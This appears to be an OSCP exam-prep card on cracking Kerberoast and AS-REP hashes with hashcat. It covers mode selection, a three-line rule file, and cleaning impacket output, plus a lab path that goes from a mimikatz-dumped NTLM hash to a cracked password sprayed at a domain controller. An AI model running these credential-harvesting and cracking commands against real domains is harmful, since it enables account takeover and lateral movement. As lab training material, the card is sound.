title: Cracking Kerberos Roast Hashes — Modes, Rules, and the Traps
body:
You have a roast hash (kerberoast or AS-REP) and need the cleartext. This sounds trivial but three specific mistakes will make a perfectly crackable hash look uncrackable. Every one of them produces a misleading result instead of an error, so you think the password is hard when really your command is wrong.

TRAP 1 — WRONG MODE (the silent killer):
The hash mode must match the hash type, and the two roast types look similar but use different modes. If you run the wrong mode you get 'Signature unmatched / No hashes loaded' (if you're lucky) or it parses something subtly wrong. Read the hash prefix to pick the mode:
  $krb5tgs$23$   -> kerberoast, RC4   -> -m 13100
  $krb5asrep$23$ -> AS-REP roast, RC4 -> -m 18200
  $krb5tgs$18$   -> kerberoast, AES256 -> -m 19700
  $krb5asrep$18$ -> AS-REP roast, AES256 -> -m 19600
The single most common waste of time: running -m 13100 on a $krb5asrep$ hash. Mnemonic: AS-REP = 18200, TGS = 13100. The prefix tells you every time.

TRAP 2 — INCOMPLETE RULE FILE:
A rule file applies ONE transformation per line, and each candidate word is tried once per rule. If your rule file contains only '$1', the ONLY thing tested is word+1 — never the bare word, never word+!. The OSCP AD capstone explicitly requires a rule that tries nothing / append 1 / append !, which means THREE lines:
  :
  $1
  $!
With only '$1' in the file you'll exhaust rockyou and crack nothing even when the real password is the bare word or word+!.

TRAP 3 — LOG LINES IN THE HASH FILE:
If you pipe impacket output to a file with 'tee' or '>', you capture the '[*]' banner and '[-] User x doesn't have...' lines mixed in with the hashes. hashcat then errors per junk line. Either grep out just the hashes, or use impacket's -outputfile to write a clean file in the first place.

Get these three right and roast hashes from a lab almost always fall in seconds on CPU.
cmd:
# ══════════════════════════════════════════════════
# STEP 0 — IDENTIFY THE HASH (read the prefix)
# ══════════════════════════════════════════════════
head -c 40 hash.txt
#   $krb5tgs$23$   -> -m 13100   (kerberoast)
#   $krb5asrep$23$ -> -m 18200   (AS-REP roast)
#   $krb5tgs$18$   -> -m 19700   (kerberoast AES)
#   $krb5asrep$18$ -> -m 19600   (AS-REP roast AES)

# ══════════════════════════════════════════════════
# STEP 1 — GET A CLEAN HASH FILE
# ══════════════════════════════════════════════════
# BEST: have impacket write it clean (no log lines, hashcat format)
impacket-GetNPUsers corp.com/ -usersfile users.txt -dc-ip <DC-IP> -no-pass -format hashcat -outputfile asrep.txt
impacket-GetUserSPNs corp.com/pete:'Nexus123!' -dc-ip <DC-IP> -request -outputfile tgs.txt

# SALVAGE: if you already teed messy output, grep the hash lines
grep '^\$krb5asrep\$' messy.txt > asrep_clean.txt    # AS-REP
grep '^\$krb5tgs\$'   messy.txt > tgs_clean.txt       # kerberoast

# VERIFY the file is clean before cracking:
wc -l asrep_clean.txt          # should equal number of roastable users
grep -c ' ' asrep_clean.txt    # should be 0 — no spaces inside hashes
awk '{print length}' asrep_clean.txt   # each line ~400-600 chars; short = paste-mangled

# ══════════════════════════════════════════════════
# STEP 2 — BUILD THE RULE FILE (the capstone rule)
# ══════════════════════════════════════════════════
# 'nothing, a 1, or a !' = exactly three lines:
cat > demo.rule <<'EOF'
:
$1
$!
EOF

# Sanity-check it: 3 lines, no CRLF
cat -A demo.rule
# Should show:   :$   $1$   $!$    (the $ is the newline marker)
# Rules expand keyspace 3x. hashcat will report 'Rules: 3' at start — confirm that.

# ══════════════════════════════════════════════════
# STEP 3 — CRACK (match mode to hash!)
# ══════════════════════════════════════════════════
# AS-REP (dave/mike style):
sudo hashcat -m 18200 asrep_clean.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force

# Kerberoast (iis_service / backupuser style):
sudo hashcat -m 13100 tgs_clean.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force

# Multiple hashes of the SAME type can live in one file — hashcat cracks all of them.

# ══════════════════════════════════════════════════
# STEP 4 — SHOW RESULTS
# ══════════════════════════════════════════════════
hashcat -m 18200 asrep_clean.txt --show
hashcat -m 13100 tgs_clean.txt   --show
# Output is hash:password — read the username from inside the hash
# (the word after the first * for tgs, or before the @ for asrep).

# ══════════════════════════════════════════════════
# IF THE CAPSTONE RULE EXHAUSTS WITH NO CRACK
# ══════════════════════════════════════════════════
# First re-check: right mode? complete rule file? clean hash? (the 3 traps)
# Then, if you're NOT bound to the capstone rule, widen:
sudo hashcat -m 13100 tgs_clean.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
# (best64 = ~77 rules: caps, suffixes, leet, etc. The default reach-for ruleset.)
# Still nothing? The password may be out of rockyou's reach — pivot to another
# account or attack path rather than grinding bigger rulesets on the exam clock.

# ══════════════════════════════════════════════════
# HASHCAT RULE PRIMER (memorize these)
# ══════════════════════════════════════════════════
#   :        do nothing (try word as-is)
#   $X       append character X         password -> passwordX
#   ^X       prepend character X         password -> Xpassword
#   c        capitalize first, rest lower password -> Password
#   u / l    upper / lower all
# Chain on one line, space-separated:
#   c $1     -> Password1
#   c $! $1  -> Password!1
# Separate lines = separate rules tried per word.

# ══════════════════════════════════════════════════
# BONUS — CRACKING A CACHED NTLM HASH (-m 1000)
# ══════════════════════════════════════════════════
# Roast hashes aren't the only thing you'll crack. When you dump a box with
# mimikatz sekurlsa::logonpasswords, cached sessions hand you NTLM hashes for
# every user who logged on. Those are mode 1000 and the SAME rule works.
#
# Capstone 1 path: cracked mike (AS-REP) -> mike Pwn3d on CLIENT75 ->
# mimikatz showed maria's session with NTLM 2a944a58d4ffa77137b2c587e6ed7626.
# That hash is the pivot to the target. Crack it:
echo '2a944a58d4ffa77137b2c587e6ed7626' > maria.hash
sudo hashcat -m 1000 maria.hash /usr/share/wordlists/rockyou.txt -r demo.rule --force
#   2a944a58d4ffa77137b2c587e6ed7626:passwordt_1415
# Then spray passwordt_1415 -> maria Pwn3d on DC1. One rule, three hash types
# (13100 / 18200 / 1000) across the whole chain.

# ══════════════════════════════════════════════════
# NOTE ON --force AND SPEED
# ══════════════════════════════════════════════════
# --force bypasses the no-GPU warning; fine on a CPU-only Kali VM.
# ~2.5-3 MH/s on CPU still clears rockyou x3-rule in well under a minute
# for Kerberos hashes. NTLM (-m 1000) runs ~10x faster.
warn: The wrong hashcat mode does not always error loudly — sometimes it loads and exhausts, leaving you convinced the password is hard when your command was simply wrong. Before assuming a roast hash is uncrackable, verify all three: mode matches the prefix, the rule file has every line you intended (check 'Rules: N' in hashcat's startup output), and the hash file contains only hash lines. This is a sensitive area for time pressure on the exam — a misdiagnosed 'uncrackable' hash sends people down the wrong path for hours.

choices.label: I cracked it — spray the credential everywhere
Cracked — now what do I do with creds?
Need to GET a kerberoast hash first
